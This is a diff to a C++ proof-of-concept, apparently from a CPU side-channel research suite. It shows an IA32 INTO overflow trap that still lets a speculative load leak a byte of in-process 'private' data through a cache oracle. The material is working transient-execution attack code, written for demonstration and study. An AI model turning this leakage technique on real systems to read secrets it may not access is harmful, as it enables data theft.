@@ -19,18 +19,15 @@
  * Since the overflow trap can be invoked only by the INTO instruction and that
  * instruction opcode exists only on IA32, this vulnerability cannot be
  * demonstrated on X64 or AMD64.
- * We cause the overflow trap by taking the secret address that should not be
- * accessed and adding or subtracting from it twice 0x80000000. That cannot
- * change its value because it's always 32-bit number. We pick addition or
- * subtraction by the first bit of the address, so that the second operation
- * creates an overflow. Afterwards we yield the INTO instruction and fetch
- * from the address. Even though the INTO instruction triggers OF (which is
- * ensured by the dead code guard), the next load is speculatively performed.
+ * We cause the overflow trap by making the OF flag in EFLAGS being set.
+ * Afterwards we yield the INTO instruction and fetch from the address. Even
+ * though the INTO instruction triggers OF (which is ensured by the dead code
+ * guard), the next load is speculatively performed.
  **/
 
 #include "compiler_specifics.h"
 
-#if !defined(__linux__) && !defined(__APPLE__)
+#if !SAFESIDE_LINUX && !SAFESIDE_MAC
 #  error Unsupported OS. Linux or MacOS required.
 #endif
 
@@ -39,6 +36,7 @@
 #endif
 
 #include <array>
+#include <climits>
 #include <cstring>
 #include <iostream>
 
@@ -46,24 +44,30 @@
 
 #include "cache_sidechannel.h"
 #include "instr.h"
-
-const char *public_data = "Hello, world!";
-const char *private_data = "It's a s3kr3t!!!";
+#include "local_content.h"
 
 static char LeakByte(const char *data, size_t offset) {
   CacheSideChannel sidechannel;
-  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
+  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
 
   for (int run = 0;; ++run) {
     size_t safe_offset = run % strlen(data);
     sidechannel.FlushOracle();
 
     for (int i = 0; i < 1000; ++i) {
-      // Succeeds.
-      FetchAfterFalseOFCheck(isolated_oracle.data(), 4096, data, safe_offset);
+      const char *safe_address = reinterpret_cast<const char *>(oracle.data() +
+          static_cast<uint8_t>(data[safe_offset]));
 
+      // Succeeds.
+      SupposedlySafeOffsetAndDereference(safe_address, 0);
+
+      const char *unsafe_address = reinterpret_cast<const char *>(
+          oracle.data() + static_cast<uint8_t>(data[offset]));
+
+      bool firstbit = reinterpret_cast<ptrdiff_t>(unsafe_address) & 0x80000000;
+      int shift = INT_MAX - 2 * firstbit * INT_MAX;
       // This crashes by the OF trap being raised.
-      FetchAfterTrueOFCheck(isolated_oracle.data(), 4096, data, offset);
+      SupposedlySafeOffsetAndDereference(unsafe_address + shift, -shift);
 
       std::cout << "Dead code. Must not be printed." << std::endl;
 
